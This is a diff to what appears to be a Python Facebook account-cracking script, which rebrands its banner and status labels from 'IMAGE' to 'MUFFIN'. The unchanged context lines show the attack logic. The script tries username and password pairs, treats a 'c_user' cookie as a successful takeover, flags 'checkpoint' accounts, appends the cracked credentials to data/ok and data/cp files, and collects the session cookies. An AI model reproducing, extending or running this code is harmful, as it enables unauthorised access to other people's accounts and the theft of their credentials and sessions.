@@ -78,16 +78,16 @@ class Main:
 			exit(" ! Your token Expired ! ")
 		os.system("clear")
 		print("""\x1b[1;95m
-
- ██▓ ███▄ ▄███▓ ▄▄▄        ▄████ ▓█████ 
-▓██▒▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ 
-▒██▒▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒███   
-░██░▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ 
-░██░▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
-░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
- ▒ ░░  ░      ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
- ▒ ░░      ░     ░   ▒   ░ ░   ░    ░   
- ░         ░         ░  ░      ░    ░  ░
+ ███▄ ▄███▓ █    ██   █████▒ █████▒██▓ ███▄    █ 
+▓██▒▀█▀ ██▒ ██  ▓██▒▓██   ▒▓██   ▒▓██▒ ██ ▀█   █ 
+▓██    ▓██░▓██  ▒██░▒████ ░▒████ ░▒██▒▓██  ▀█ ██▒
+▒██    ▒██ ▓▓█  ░██░░▓█▒  ░░▓█▒  ░░██░▓██▒  ▐▌██▒
+▒██▒   ░██▒▒▒█████▓ ░▒█░   ░▒█░   ░██░▒██░   ▓██░
+░ ▒░   ░  ░░▒▓▒ ▒ ▒  ▒ ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
+░  ░      ░░░▒░ ░ ░  ░      ░      ▒ ░░ ░░   ░ ▒░
+░      ░    ░░░ ░ ░  ░ ░    ░ ░    ▒ ░   ░   ░ ░ 
+       ░      ░                    ░           ░ 
+                                                 
                                         
 
                                      
@@ -200,7 +200,7 @@ class Crack:
 				'Accept-Language'	:	'id-ID,id;q=0.9'
 			})
 			if "c_user" in session.cookies.get_dict():
-				print('\r%s[IMAGE-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
+				print('\r%s[MUFFIN-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
 				ok.append(user+"|"+pw)
 				open("data/ok","a").write(user+"|"+pw+"\n")
 				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
@@ -209,7 +209,7 @@ class Crack:
 				sys.stdout.flush()
 				break
 			elif "checkpoint" in session.cookies.get_dict():
-				print('\r%s[IMAGE-DON-CHECKPOINT] %s • %s •'%(M,user,pw))
+				print('\r%s[MUFFIN-DON-CHECKPOINT] %s • %s •'%(M,user,pw))
 				cp.append(user+"|"+pw)
 				open("data/cp","a").write(user+"|"+pw+"\n")
 				h2 = {
